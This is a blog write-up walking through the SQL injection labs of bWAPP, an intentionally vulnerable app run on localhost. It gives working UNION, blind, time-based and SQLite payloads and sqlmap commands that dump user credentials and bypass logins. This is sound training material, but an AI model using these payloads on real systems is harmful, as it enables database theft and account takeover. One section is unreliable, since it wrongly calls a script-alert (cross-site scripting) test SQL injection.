---
title: "bWAPP SQL Injection (SQLi) Labs — Writeups"
description: ""
pubDate: "2025-07-22T13:49:05.000Z"
---

### **bWAPP SQL Injection (SQLi) Labs — Writeups**

**Originally posted on <a href="https://medium.com/@bl0ss0mx5/bwapp-sql-injection-sqli-labs-writeups-4d1acd911332" target="_blank" rel="noopener noreferrer">my Medium page</a>.**

---

## bWAPP SQL Injection (SQLi) Labs — Writeups

### Introduction: What is SQL Injection (SQLi)?

SQL Injection (or **SQLi**) is a common and dangerous web application vulnerability. It happens when an attacker is able to insert or “inject” malicious SQL code into a query that an application sends to its database.

This allows attackers to:

*   View sensitive information (like usernames and passwords)
*   Bypass login pages
*   Modify or delete database contents
*   Even take full control of the database server in severe cases

**Why does it happen?**  
Because the application takes user input (like form fields or URL parameters) and adds it directly into SQL queries **without properly checking or cleaning it**.

**Example:**  
If a login form uses this:
<pre>
SELECT * FROM users WHERE username = 'admin' AND password = '1234';
</pre>
And an attacker enters this as the username:
<pre>
' OR '1'='1
</pre>
The final query becomes:
<pre>
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '1234';
</pre>
Since `'1'='1'` is always true — the attacker can log in without valid credentials.

----

**bWAPP (Buggy Web Application)** is a free, intentionally vulnerable application designed for learning and practicing web security attacks like SQL Injection.

---

### SQL Injection (GET/Search)

![](https://cdn-images-1.medium.com/max/704/1*fygwaQKchfF3uPvthTFLSQ.png)

This lab has a **search bar** to look up movie names. It’s vulnerable to SQL Injection.

Check for SQL injection: `'`

> Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’’ at line 1

Confirms SQL Injection point and that the backend is **MySQL**

**Find the Number of Columns:**

<pre>
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL -- -
</pre>

![](https://cdn-images-1.medium.com/max/702/1*nqjr9Kj5LwtLEoUz1z6qjQ.png)

👉 7 columns required to avoid error.

**Get database name:**

<pre>' UNION SELECT NULL, database(), NULL, NULL, NULL, NULL, NULL -- -</pre>

![](https://cdn-images-1.medium.com/max/694/1*iP5mWntbo8Z-RzGII_L6vQ.png)

`bWAPP`

**List All Tables:**

<pre>' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='bWAPP' -- -</pre>

![](https://cdn-images-1.medium.com/max/694/1*NF45dwcz9QTdooRlq0k2Gg.png)

**List Columns from** **users Table:**

<pre>' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' -- -</pre>

![](https://cdn-images-1.medium.com/max/694/1*IwJfu9o9Q3eN1k_qd1bmxQ.png)

**Dump Data from** **users Table:**

<pre>' UNION SELECT NULL, GROUP_CONCAT(CONCAT_WS(':', id, login, password, email, secret)), NULL, NULL, NULL, NULL, NULL FROM users -- -</pre>

![](https://cdn-images-1.medium.com/max/477/1*DeJxqVeX5oz6AX_-S2iagg.png)

👉 Extracted all user credentials and secrets.

---

### SQL Injection (GET/Select)

![](https://cdn-images-1.medium.com/max/704/1*fH6YVEtiYdVcpM7QrRvPCA.png)

URL: [http://localhost:8080/sqli_2.php](http://localhost:8080/sqli_2.php)

URL is getting changed upon selecting a movie

![](https://cdn-images-1.medium.com/max/701/1*crKATpiDjzs7nW8Uu8ZkmA.png)

> [http://localhost:8080/sqli_2.php?movie=3&action=go](http://localhost:8080/sqli_2.php?movie=3&action=go)

Checking if the url is vulnerable

[http://localhost:8080/sqli_2.php?movie=3%27&action=go](http://localhost:8080/sqli_2.php?movie=3%27&action=go) (%27 is url encode of `'`)

> Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1

✅ Confirms the URL parameter is **vulnerable to SQLi**.

Whenever we enter 1, 2, etc., we get only that specific movie. By observing closely, we noticed that the movie names start with ID 1.  
Now, let’s try movie=0 to find the number of columns.

**Find Number of Columns:**

http://localhost:8080/sqli_2.php?movie=0%20union%20select%201,2,3,4,5,6,7%20--%20-&action=go

![](https://cdn-images-1.medium.com/max/701/1*hcrUCDeecVJ5o2WQwOw4Gg.png)

👉 Only **2, 3, 4, 5** are reflected in the response.

**Dump Data from** **users Table:**

> [http://localhost:8080/sqli_2.php?movie=0%20union%20select%201,(select%20group_concat(id,0x3a,login,0x3a,password,0x3a,secret,0x3a,admin%20separator%200x0a)%20from%20users),3,4,5,6,7%20--%20-](http://localhost:8080/sqli_2.php?movie=0%20union%20select%201,(select%20group_concat(id,0x3a,login,0x3a,password,0x3a,secret,0x3a,admin%20separator%200x0a)%20from%20users),3,4,5,6,7%20--%20-)

![](https://cdn-images-1.medium.com/max/773/1*7ToYXPwCh9tVqjIdTsJHYA.png)

👉 Retrieved all user details (ID, login, password, secret, admin status).

---

### SQL Injection (POST/Search)

![](https://cdn-images-1.medium.com/max/773/1*mhhyow28F-FFh14tqDrw-A.png)

**Dump data from** **users table:**

Using the same query as in the GET/search challenge..

<pre>
' UNION SELECT NULL, GROUP_CONCAT(CONCAT_WS(':', id, login, password, email, secret)), NULL, NULL, NULL, NULL, NULL FROM users -- - </pre>

![](https://cdn-images-1.medium.com/max/472/1*m5uNhvph_Mn17gCwGloyxQ.png)

---

### SQL Injection (POST/Search)

![](https://cdn-images-1.medium.com/max/694/1*r7nZVHSEvp5dg8vbOF6oMA.png)

This vulnerability is similar to `GET/SELECT`. However, the difference here is that to test for POST/SELECT, we need to capture the request in Burp Suite, send it to the Repeater, and test it using a single quote (`'`), since the query is not reflected in the URL.

![](https://cdn-images-1.medium.com/max/662/0*5NRMJOy-m-Dymqh_.png)

Tested for SQLi with `'`

![](https://cdn-images-1.medium.com/max/658/0*ASZUNONOtZf0loKS.png)

> Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1

Received SQL syntax error confirming vulnerability.

**Using the same payload as GET/SELECT:**

<pre>
0%20union%20select%201,database(),user(),(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),5,6,7%20--%20-</pre>

![](https://cdn-images-1.medium.com/proxy/1*7ToYXPwCh9tVqjIdTsJHYA.png)

Successfully retrieved column names from the users table.

---

### SQL Injection (AJAX/JSON/jQuery)

![](https://cdn-images-1.medium.com/max/702/1*pTGHECIW2JMzw3BcevkhNg.png)

Using the same query as `GET/SELECT`, we were able to retrieve data from the users table.

---

### SQL Injection (CAPTCHA)

This is similar to **GET/SEARCH**, except that a CAPTCHA must be completed before accessing the movie search page.

![](https://cdn-images-1.medium.com/max/950/0*hMDIjW2ZKdYo6dxY.png)

After solving the CAPTCHA, we’re taken to the movie search page, and the same SQLi payload works in the URL.

---

### SQL Injection (Login Form/Hero)

![](https://cdn-images-1.medium.com/max/657/1*rFhl6XOMvLD1eJElilk96A.png)

This challenge requires login.  
**Using the classic SQLi payload:** `' OR 1=1; --` with a random password.  
Successfully logged in as the superhero user.

![](https://cdn-images-1.medium.com/max/375/1*gv1UTouRsn4lDeYGLI4u5Q.png)

---

### SQL Injection (Login Form/User)

![](https://cdn-images-1.medium.com/max/646/1*FIYe9e6kuzaS4gCqdClVew.png)

The login form initially appeared to be vulnerable, so test it using the basic payload: `' OR 1=1; -- -`.  
This returned an **invalid credentials** error.  
Enter a single quote (`'`) in the login field to confirm SQLi.

> Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1

✅ **SQL Injection confirmed.**

Attempting multiple payloads couldn’t result in successful login. So, turn to `Sqlmap`, which automates SQL injection attacks by testing and extracting data if the target is vulnerable.

To prepare Sqlmap, gather:

*   The **POST data** being sent during login
*   The **cookie** used for the session

Both can be found via browser ```dev tools → Network tab (Ctrl + Shift + I)```.

![](https://cdn-images-1.medium.com/max/335/1*GEpfwwi98tj3EF0KnKA7_w.png)

![](https://cdn-images-1.medium.com/max/330/1*CM6fw24dpS2oQyKRrMLnSA.png)

**Enumerate Databases:**
<pre>
sqlmap -u "http://localhost:8080/sqli_16.php" --cookie="security_level=0; PHPSESSID=tddqn82n8ifcq12dpgvum4i510" --data="login=jnkjg&password=kjhb&form=submit" -dbs --fresh-queries</pre>

![](https://cdn-images-1.medium.com/max/1024/1*474yKnFNxZX6qTWhI_A1GA.png)

![](https://cdn-images-1.medium.com/max/969/1*QGDZkcXaq2WJpkW19yYs1A.png)

**Dump the database** `bWAPP`:
<pre>
sqlmap -u "http://localhost:8080/sqli_16.php" --cookie="security_level=0; PHPSESSID=tddqn82n8ifcq12dpgvum4i510" --data="login=jnkjg&password=kjhb&form=submit" -D bWAPP --tables</pre>

![](https://cdn-images-1.medium.com/max/508/1*Onr1ZGdMDvRdlDKHApIkUg.png)

**Find the number of columns in the** `users` **table:**
<pre>
sqlmap -u "http://localhost:8080/sqli_16.php" --cookie="security_level=0; PHPSESSID=tddqn82n8ifcq12dpgvum4i510" --data="login=jnkjg&password=kjhb&form=submit" -D bWAPP -T users --columns</pre>

![](https://cdn-images-1.medium.com/max/319/1*4huDoaUmyz3FhFrq5UJ9vQ.png)

**Retrieving the data from** `users` **table:**
<pre>
sqlmap -u "http://localhost:8080/sqli_16.php" --cookie="security_level=0; PHPSESSID=tddqn82n8ifcq12dpgvum4i510" --data="login=jnkjg&password=kjhb&form=submit" -D bWAPP -T users -C email,id,login,password,secret --dump</pre>

![](https://cdn-images-1.medium.com/max/1024/1*OjyQLprbZ9IwFPsdWQsR8w.png)

---

### SQL Injection (SQLite)

![](https://cdn-images-1.medium.com/max/693/1*4sbxPicLyZnVeK7TWc5BMw.png)

We can use the same method as in `GET/SEARCH`. The only difference here is the database: it’s `SQLite`.  
Instead of information_schema (used in MySQL), **SQLite** uses the `sqlite_master` table, which contains metadata about all tables in the database.  
Like the other challenges, this one also has a users table, which we identified using the sqlite_master table in SQLite.

**Payload to retrieve the data from** **users table:**
<pre>
' UNION SELECT NULL, GROUP_CONCAT(id || ':' || login || ':' || password || ':' || email || ':' || secret), NULL, NULL, NULL, NULL, NULL FROM users -- -</pre>

---

### SQL Injection — Stored (Blog)

![](https://cdn-images-1.medium.com/max/760/1*C61l2gxHY6Y3St2-DQwwyw.png)

This is stored SQL injection where user enters the payload and the payload is reflected when the page is loading what the user enters. eg: comments

Let’s enter 
```
<script>alert(1)</script>
```
to see if the alert is getting reflected.

We have got the alert which tells us that this is vulnerable to SQLi

Booooooommm!!!

---

### SQL Injection — Stored (SQLite)

![](https://cdn-images-1.medium.com/max/762/1*yAqyVpPP_GzG21u5-mAAJg.png)

Testing with a `'`:

![](https://cdn-images-1.medium.com/max/738/0*f_1cfTzpsn5BodcO.png)

The entry was accepted, but nothing was reflected back in the blog post

Using sqlite enumeration paylod 
<pre>', (select name from sqlite_master where type='table'));</pre>

This payload successfully inserted data, and observed that the **table name is** `blog`

With this technique, all the other data can be enumerated.

---

### SQL Injection — Stored (User-Agent)

![](https://cdn-images-1.medium.com/max/742/1*2Z6XrFPnr6rlFDC6489mNA.png)

Reload the page and capture the request with `Burp`.

![](https://cdn-images-1.medium.com/max/635/0*tJ2a57qyrqLBZDe_.png)

By injecting a single quote in the User-Agent header, the server responded differently, confirming SQL injection.

Use the same SQLite payloads to enumerate tables and columns via the User-Agent field.

---

### SQL Injection — Stored (XML)

![](https://cdn-images-1.medium.com/max/594/1*l76VAYeItlJFvAdjl6KlTQ.png)

Reload the page and capture the request with burp.

![](https://cdn-images-1.medium.com/max/384/1*WqyK7E7E6nHU2iJdvXnwcA.png)

Send it to the **Repeater** and insert a single quote (`'`) in the `<login>` tag to test for SQL injection.

![](https://cdn-images-1.medium.com/max/839/1*uoj1UyPvRRBzLlsE4PCOuA.png)

The response returned a **MySQL error**, confirming the vulnerability.  
From here, we can enumerate the database using the same SQL injection techniques demonstrated above.

---

### SQL Injection — Blind — Boolean-Based

![](https://cdn-images-1.medium.com/max/727/1*wYebHGjzsjJsRO1i-TyNLA.png)

This is a boolean-based blind SQL injection, where the server only tells us if a condition is `TRUE or FALSE` — no actual data is returned.

trying:
<pre>
' OR 1=1; -- -
</pre>
![](https://cdn-images-1.medium.com/max/727/1*mlxRm8T-KsCKPy2eLeTA6Q.png)

Returns:

> The movie exists in our database!

This confirms that SQL injection is possible.

To extract table names and data using blind SQL injection, we need to **brute-force each character** by checking whether a specific letter exists at a certain position in the database name, table name, column name, or actual data.

---

### SQL Injection — Blind — Time-Based

![](https://cdn-images-1.medium.com/max/672/1*Z4b0H2tlCfI-pEQscH2Nbg.png)

Since this is a time-based SQL injection, we can use `SLEEP()` to test for vulnerabilities. If the page delays by the specified time, the query executed successfully.

Test payload:
<pre>
' OR SLEEP(5); -- -
</pre>
If the page takes ~5 seconds to load, the input is vulnerable.

To extract data, we can use conditional delays:
<pre>
' OR IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') = 7, SLEEP(5), 0); -- -
</pre>
If the delay occurs, it confirms that the users table has 7 columns. We can use similar logic to extract more information.

---

### SQL Injection — Blind (SQLite)

![](https://cdn-images-1.medium.com/max/591/1*Ndta1iJcYI8S8-4mdd8DqA.png)

Let’s test if the search bar is vulnerable using:
<pre>
' OR 1=1 --
</pre>
![](https://cdn-images-1.medium.com/max/376/1*VQREI7cpnHTjGtgZoWbimQ.png)

The response confirms that the movie exists in the database, indicating SQL injection is possible.  
We can now enumerate further using **SQLite-specific syntax**.

---

Here, I explored different types of SQL Injection in **bWAPP**, like boolean-based, time-based, union-based, and stored SQLi on both **MySQL and SQLite**. Trying them out helped me understand how these attacks actually work and how to spot them.

---

**This is also available on my [Medium page](https://medium.com/@bl0ss0mx5/bwapp-sql-injection-sqli-labs-writeups-4d1acd911332) and [Github](https://github.com/Bl0ss0mX5/Web-Vuln-Research/tree/main/SQLi) — feel free to check it out!**